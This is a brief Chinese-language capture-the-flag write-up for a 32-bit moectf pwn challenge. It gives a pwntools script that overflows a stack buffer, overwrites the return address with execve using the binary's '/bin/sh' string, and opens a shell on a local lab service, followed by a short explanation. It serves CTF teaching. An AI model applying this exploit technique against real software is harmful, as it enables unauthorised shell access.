# moectf 这是什么？32bit

by Maple

```python
from pwn import *
#p = process('./pwn')
p = remote('127.0.0.1',57062)
elf = ELF('./pwn')
p.sendline()

payload = b'b'*0x28+b'b'*0x4
payload+=flat([
    elf.sym[b'execve'],
    0,
    next(elf.search(b'/bin/sh')),
    0,
    0
    ])
p.sendline(payload)
p.interactive()
```

其实就是直接自己构造出来`execve(0,/bin/sh,0,0)`

先填充满，覆盖`rbp`，然后将返回地址覆盖为`execve`，32位程序用栈传参，所以直接按照栈的顺序依次存入就好